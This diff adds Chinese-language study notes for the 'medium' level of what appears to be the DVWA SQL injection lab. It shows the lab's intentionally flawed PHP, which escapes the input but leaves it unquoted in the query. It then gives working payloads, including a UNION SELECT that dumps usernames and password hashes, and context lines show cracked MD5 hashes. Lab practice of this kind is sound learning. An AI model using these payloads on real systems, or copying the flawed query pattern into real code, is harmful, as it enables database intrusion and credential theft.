@@ -101,3 +101,43 @@ Surname: admin202cb962ac59075b964b07152d234b70,gordonbe99a18c428cb38d5f260853678
 ```
 
 > [md5](https://cmd5.com/) 解密获取明文密码。牛皮。
+
+
+
+
+
+
+
+### 2. medium
+
+> 中级
+>
+> 代码
+
+```php
+
+<?php
+
+if( isset( $_POST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_POST[ 'id' ];
+
+    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
+
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
+
+```
+
+> `mysqli_real_escape_string`转义特殊字符
+
+> burp抓包，该包，用sql注入思路获取数据。
+
+```shell
+1. 确认是否有注入
+id=1 or 1=1 
+
+2. 获取数据
+id=1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(user,password) from users #&Submit=Submit
+```
+
